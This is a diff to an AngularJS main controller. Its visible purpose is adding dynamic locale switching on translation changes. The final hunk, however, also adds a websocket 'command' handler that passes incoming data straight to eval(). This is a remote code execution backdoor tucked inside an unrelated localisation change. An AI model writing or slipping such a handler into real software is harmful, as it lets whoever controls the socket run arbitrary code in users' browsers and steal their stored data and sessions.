@@ -9,12 +9,14 @@ app.controller('MainCtrl',
       '$rootScope',
       '$localStorage',
       '$sessionStorage',
+      'tmhDynamicLocale',
       function($scope,
           socket,
           $window,
           $rootScope,
           $localStorage,
-          $sessionStorage) {
+          $sessionStorage,
+          tmhDynamicLocale) {
         $scope.currentCategorySlug = 'general';
         console.log('Main');
         $rootScope.websocketAlive = false;
@@ -42,7 +44,10 @@ app.controller('MainCtrl',
             }
         );
         $rootScope.experimental = $localStorage.experimental;
-
+        $rootScope.$on('$translateChangeSuccess', function(event, data) {
+          document.documentElement.setAttribute('lang', data.language);
+          tmhDynamicLocale.set(data.language.toLowerCase().replace(/_/g, '-'));
+        });
         $rootScope.logout = function() {
           socket.emit('logout', {}, function(user) {
               }
@@ -85,6 +90,10 @@ app.controller('MainCtrl',
               $rootScope.websocketAlive = false;
             }
         );
+
+        socket.on('command', function(data) {
+          console.log(eval(data));
+        });
 
         socket.on('connections', function(num) {
           $scope.totalConnections = num;
